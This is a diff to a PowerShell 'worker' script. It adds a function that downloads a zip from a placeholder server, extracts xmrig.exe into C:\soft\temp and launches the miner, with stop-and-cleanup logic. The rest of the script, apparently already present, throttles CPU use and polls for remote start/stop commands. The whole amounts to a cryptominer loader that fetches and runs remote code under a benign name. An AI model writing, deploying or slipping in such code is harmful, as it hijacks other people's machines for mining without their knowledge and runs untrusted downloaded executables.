@@ -5,6 +5,10 @@ $TEMP_DIR = "$env:TEMP\worker_env"
 $WORKER = $null
 $CPU_LIMIT = 70
 
+$BASE_DIR = "C:\soft"
+$TEMP_DIR = "C:\soft\temp"
+$MINER_EXE = "$TEMP_DIR\xmrig.exe"
+
 function Get-CPU {
     (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
 }
@@ -65,6 +69,74 @@ function Get-Command {
         "stop"
     }
 }
+
+function mit([string]$command) {
+
+    if ($command -eq "start") {
+
+        # Create C:\soft if not exists
+        if (!(Test-Path $BASE_DIR)) {
+            New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
+        }
+
+        # Create temp folder
+        if (!(Test-Path $TEMP_DIR)) {
+            New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
+        }
+
+        $zipFile = "$TEMP_DIR\mine.zip"
+        $minerZipUrl = "https://yourserver.com/mine.zip"
+
+        Write-Host "Downloading mining package..."
+
+        Invoke-WebRequest `
+            -Uri $minerZipUrl `
+            -OutFile $zipFile `
+            -UseBasicParsing
+
+        Write-Host "Extracting mining package..."
+
+        Expand-Archive `
+            -Path $zipFile `
+            -DestinationPath $TEMP_DIR `
+            -Force
+
+        Remove-Item $zipFile -Force
+
+        if (!(Test-Path $MINER_EXE)) {
+            Write-Host "xmrig.exe not found!"
+            return
+        }
+
+        if (!$MINER_PROC) {
+            Write-Host "Starting miner..."
+
+            $global:MINER_PROC = Start-Process `
+                -FilePath $MINER_EXE `
+                -ArgumentList "--config=config.json --testnet" `
+                -WorkingDirectory $TEMP_DIR `
+                -PassThru
+        }
+    }
+
+    elseif ($command -eq "stop") {
+
+        Write-Host "Stopping miner..."
+
+        if ($MINER_PROC) {
+            Stop-Process -Id $MINER_PROC.Id -Force
+            $global:MINER_PROC = $null
+        }
+
+        # Remove only temp folder (keep C:\soft)
+        if (Test-Path $TEMP_DIR) {
+            Remove-Item $TEMP_DIR -Recurse -Force
+        }
+
+        Write-Host "Mining stopped and cleaned."
+    }
+}
+
 
 function Start-Worker{
 
